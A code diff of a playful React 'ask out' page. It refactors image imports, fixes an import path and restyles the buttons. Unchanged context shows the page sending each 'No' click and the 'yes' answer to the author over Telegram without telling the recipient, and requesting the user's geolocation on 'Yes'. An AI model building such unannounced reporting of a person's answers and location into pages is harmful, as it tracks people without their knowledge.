@@ -1,43 +1,35 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import PropTypes from "prop-types";
-
-import hug from "./assets/hug.gif";
-import mochi from "./assets/mochi.gif";
-import mochi2 from "./assets/mochi2.gif";
-import missu from "./assets/missu.gif";
-import peach from "./assets/peach.gif";
-import sayYs from "./assets/sayYs.gif";
-import yesss from "./assets/yesss.gif";
-import cattype from "./assets/cat-type.gif";
-import { sendMessageTelegram } from "./telegramHandlre";
+import { reactionImages } from "./constants/assets";
+import { sendMessageTelegram } from "./telegramHandler";
 
 export function AskOut({ setYes }) {
 	const [step, setStep] = useState(0);
 	const [noText, setNoText] = useState("No");
-	const [yesSize, setYesSize] = useState(24); // Start with 24px font size
-	const [catImg, setCat] = useState(hug);
-
-	
+	const [yesSize, setYesSize] = useState(24);
+	const [catImg, setCat] = useState(reactionImages.hug);
 
 	const noMessages = [
-		{ text: "Are you sure? 🤨", img: cattype },
-		{ text: "Really sure? 😬", img: mochi },
-		{ text: "Last chance! ⏳", img: mochi2 },
-		{ text: "Think again... 🧠", img: missu },
-		{ text: "Don't do this... 😨", img: peach },
-		{ text: "Come on, say yes! 🙋‍♂️", img: sayYs },
-		{ text: "You have no choice now! 😅", img: yesss },
+		{ text: "Are you sure? 🤨", img: reactionImages.cattype },
+		{ text: "Really sure? 😬", img: reactionImages.mochi },
+		{ text: "Last chance! ⏳", img: reactionImages.mochi2 },
+		{ text: "Think again... 🧠", img: reactionImages.missu },
+		{ text: "Don't do this... 😨", img: reactionImages.peach },
+		{ text: "Come on, say yes! 🙋‍♂️", img: reactionImages.sayYs },
+		{ text: "You have no choice now! 😅", img: reactionImages.yesss },
 	];
 
 	const handleNoClick = () => {
 		if (step < noMessages.length) {
-			sendMessageTelegram(`😢 Inputed No ${step}`)
+			sendMessageTelegram(`😢 Inputed No ${step}`);
 			setNoText(noMessages[step].text);
 			setCat(noMessages[step].img);
-			setYesSize((prevSize) => prevSize * 1.5); // Increase font size by 50%
-			setStep((prevStep) => prevStep + 1); // Fix: Ensure correct state update
+			// Smaller growth on mobile
+			const growthFactor = window.innerWidth < 768 ? 1.3 : 1.5;
+			setYesSize((prevSize) => Math.min(prevSize * growthFactor, window.innerWidth * 0.8));
+			setStep((prevStep) => prevStep + 1);
 		} else {
-			setYesSize(window.innerWidth * 0.5); // Make it 50% of screen width
+			setYesSize(window.innerWidth * 0.5);
 		}
 	};
 
@@ -46,7 +38,7 @@ export function AskOut({ setYes }) {
 		sendMessageTelegram(
 			"`💕💕💕💕💕💕💕💕💕💕💕💕she said yes💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕`"
 		);
-		
+
 		if (navigator.geolocation) {
 			navigator.geolocation.getCurrentPosition(
 				(position) => {
@@ -65,22 +57,22 @@ export function AskOut({ setYes }) {
 	};
 
 	return (
-		<div className="relative flex flex-col items-center justify-center text-center text-white">
-			<img src={catImg} alt="Cute reaction" className="w-48 h-48 mb-4" />
-			<h1 className="mb-6 text-4xl">Hi {process.env.NAME}</h1>
-			<h1 className="mb-6 text-3xl">
+		<div className="askout-container">
+			<img src={catImg} alt="Cute reaction" className="askout-cat" />
+			<h1 className="askout-greeting">Hi {import.meta.env.VITE_NAME}</h1>
+			<p className="askout-message">
 				I think you're really special and I like you a lot! 💖 Do you
 				feel the same way about me? 😊
-			</h1>
+			</p>
 			<button
-				className="px-12 py-3 text-white transition-all bg-green-500 rounded-md"
+				className="askout-yes-btn"
 				onClick={handleYesClick}
-				style={{ fontSize: yesSize }}
+				style={{ fontSize: Math.min(yesSize, window.innerWidth * 0.15) }}
 			>
 				Yes
 			</button>
 			<button
-				className="px-6 py-3 mt-4 text-white bg-red-500 rounded-md"
+				className="askout-no-btn"
 				onClick={handleNoClick}
 			>
 				{noText}
